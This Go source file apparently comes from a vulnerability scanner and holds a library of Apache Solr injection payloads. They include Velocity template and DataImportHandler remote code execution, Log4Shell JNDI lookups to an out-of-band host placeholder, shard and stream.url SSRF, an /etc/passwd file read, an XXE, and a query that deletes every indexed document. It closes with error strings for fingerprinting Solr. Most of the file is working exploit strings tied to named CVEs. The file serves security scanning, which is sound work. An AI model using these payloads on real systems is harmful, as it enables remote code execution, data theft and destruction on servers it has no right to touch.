// Package solrinject provides Apache Solr parameter-injection payloads.
//
// When user input lands in a Solr query parameter (q=, fq=, qt=, wt=,
// stream.body=, v.template=) without validation, the Solr query parser
// exposes RCE (Velocity template, DataImportHandler), SSRF (shards=,
// stream.url=, #httpclient), XXE (xmlparser local-param), and arbitrary
// file read. Mirrors AWVS Apache_Solr_Parameter_Injection.script.
//
// References: PortSwigger 2020 "Exploiting Apache Solr",
// CVE-2017-12629 (RCE via XXE→Velocity), CVE-2019-0193 (DIH RCE),
// CVE-2019-17558 (params.resource.loader Velocity RCE),
// CVE-2021-44228 (Log4Shell via Solr query logger),
// Veracode Solr injection cheatsheet.
package solrinject

// Impact classifies the resulting capability of a successful injection.
type Impact string

const (
	ImpactRCE      Impact = "rce"
	ImpactSSRF     Impact = "ssrf"
	ImpactFileRead Impact = "file_read"
	ImpactInfoLeak Impact = "info_leak"
)

// Payload represents a Solr injection payload.
type Payload struct {
	Value       string
	Technique   string // short technique label (velocity_rce, shards_ssrf, …)
	Impact      Impact
	Description string
	CVE         string // optional CVE reference if directly applicable
}

// GetPayloads returns all Solr injection payloads.
func GetPayloads() []Payload {
	return payloads
}

// GetByImpact returns payloads filtered by impact bucket.
func GetByImpact(impact Impact) []Payload {
	var out []Payload
	for _, p := range payloads {
		if p.Impact == impact {
			out = append(out, p)
		}
	}
	return out
}

// GetErrorPatterns returns response substrings that confirm a Solr/Lucene
// stack is parsing the request — useful for fingerprinting before firing
// exploitation payloads.
func GetErrorPatterns() []string {
	return errorPatterns
}

var payloads = []Payload{
	// --- Velocity template engine RCE (CVE-2019-17558 family) ---
	// Solr exposes the Velocity response writer; v.template lets the
	// caller submit a template inline. params.resource.loader.enabled=true
	// (default until 8.4) allows the loader to be configured at request time.
	{
		Value:       "params.resource.loader.enabled=true&wt=velocity&v.template=custom&v.template.custom=#set($x=$rt.exec(%27id%27))%20$x",
		Technique:   "velocity_rce",
		Impact:      ImpactRCE,
		CVE:         "CVE-2019-17558",
		Description: "Velocity v.template RCE via params.resource.loader",
	},
	{
		Value:       "wt=velocity&v.template=custom&v.template.custom=#set($a=$rt.getClass().forName(%27java.lang.Runtime%27))%23set($b=$a.getMethod(%27getRuntime%27))%23set($c=$b.invoke($a))$c.exec(%27id%27)",
		Technique:   "velocity_rce_runtime",
		Impact:      ImpactRCE,
		Description: "Velocity Runtime.getRuntime() reflection RCE",
	},

	// --- DataImportHandler (DIH) RCE (CVE-2019-0193) ---
	{
		Value:       "command=full-import&dataConfig=<dataConfig><dataSource type='URLDataSource'/><script>function f(){java.lang.Runtime.getRuntime().exec('id');}</script><document><entity name='a' url='http://localhost:8983' processor='XPathEntityProcessor' transformer='script:f' forEach='/'></entity></document></dataConfig>",
		Technique:   "dih_rce",
		Impact:      ImpactRCE,
		CVE:         "CVE-2019-0193",
		Description: "DataImportHandler script transformer RCE via data-config=",
	},

	// --- Log4Shell via Solr query logger (CVE-2021-44228) ---
	{
		Value:       "q=${jndi:ldap://{OAST_HOST}/solr}",
		Technique:   "log4shell",
		Impact:      ImpactRCE,
		CVE:         "CVE-2021-44228",
		Description: "Log4Shell JNDI lookup via Solr query logger",
	},
	{
		Value:       "q=${jndi:dns://{OAST_HOST}/solr}",
		Technique:   "log4shell_dns",
		Impact:      ImpactInfoLeak,
		CVE:         "CVE-2021-44228",
		Description: "Log4Shell DNS confirm-vuln probe (lower risk than ldap://)",
	},

	// --- SSRF via shards= ---
	{
		Value:       "shards=http://{OAST_HOST}/solr/core/select?q=*",
		Technique:   "shards_ssrf",
		Impact:      ImpactSSRF,
		Description: "Inter-shard query SSRF — Solr fetches attacker URL",
	},

	// --- SSRF / file read via stream.url= ---
	{
		Value:       "stream.url=http://{OAST_HOST}/import",
		Technique:   "stream_url_ssrf",
		Impact:      ImpactSSRF,
		Description: "ContentStream URL SSRF",
	},
	{
		Value:       "stream.url=file:///etc/passwd",
		Technique:   "stream_url_file_read",
		Impact:      ImpactFileRead,
		Description: "ContentStream file:// local file read",
	},

	// --- Arbitrary content injection via stream.body= ---
	{
		Value:       "stream.body=<delete><query>*:*</query></delete>",
		Technique:   "stream_body_inject",
		Impact:      ImpactInfoLeak,
		Description: "ContentStream body injection — arbitrary admin op",
	},

	// --- XXE via xmlparser local-param (CVE-2017-12629) ---
	{
		Value:       "q={!xmlparser v='<!DOCTYPE a SYSTEM \"http://{OAST_HOST}/x.dtd\"><a></a>'}",
		Technique:   "xmlparser_xxe",
		Impact:      ImpactSSRF,
		CVE:         "CVE-2017-12629",
		Description: "XMLParser local-param XXE → SSRF / file read",
	},

	// --- Local-param parser swaps ---
	{
		Value:       "q={!join from=id to=id}*:*",
		Technique:   "join_query",
		Impact:      ImpactInfoLeak,
		Description: "Join parser query reshape",
	},
	{
		Value:       "qt=/dataimport&command=status",
		Technique:   "request_handler_swap",
		Impact:      ImpactInfoLeak,
		Description: "qt= request handler swap (probe for /dataimport)",
	},
	{
		Value:       "qt=/admin/cores",
		Technique:   "admin_cores_probe",
		Impact:      ImpactInfoLeak,
		Description: "qt= swap to /admin/cores (core listing)",
	},

	// --- SolrCloud httpclient SSRF ---
	{
		Value:       "shards=#httpclient://{OAST_HOST}/x",
		Technique:   "httpclient_ssrf",
		Impact:      ImpactSSRF,
		Description: "SolrCloud #httpclient shards SSRF",
	},
}

var errorPatterns = []string{
	"org.apache.solr.common.SolrException",
	"org.apache.lucene.queryparser.classic.ParseException",
	"SolrException: Cannot parse",
	"SolrException: undefined field",
	"SolrException: missing required field",
	"velocity.exception.ParseErrorException",
	"VelocityTools",
	"SolrCore",
	"SolrException: Unknown query parser",
	"SolrException: Unknown request handler",
}
